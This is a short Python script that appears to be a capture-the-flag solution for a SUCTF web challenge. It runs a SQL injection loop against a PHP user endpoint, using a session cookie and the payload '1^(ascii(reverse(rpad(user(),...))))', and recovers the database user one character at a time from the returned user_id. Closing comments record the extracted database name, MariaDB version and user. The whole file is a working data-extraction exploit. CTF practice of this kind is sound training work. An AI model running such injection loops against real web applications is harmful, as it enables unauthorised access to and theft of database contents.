# -*- coding:utf-8 -*-
import requests
import re

url = "http://web.suctf.asuri.org:85/user/user.php?id="
cookie = {"PHPSESSID": "0i2tnpqmbup43adj322p0srts1"}
flag = ''

for i in range(20):
    payload = "1^(ascii(reverse(rpad(user(),{},0x61))))"
    res = requests.get(url + payload.format(str(i)), cookies=cookie)
    user_id = re.findall(r"(?<=user_id:)[0-9]+", res.content)[0]
    flag += chr(int(user_id) ^ 1)
    print flag


# database: ctf
# version: 10.0.34-MariaDB-0ubuntu0.16.04.1
# user: suctf@localhost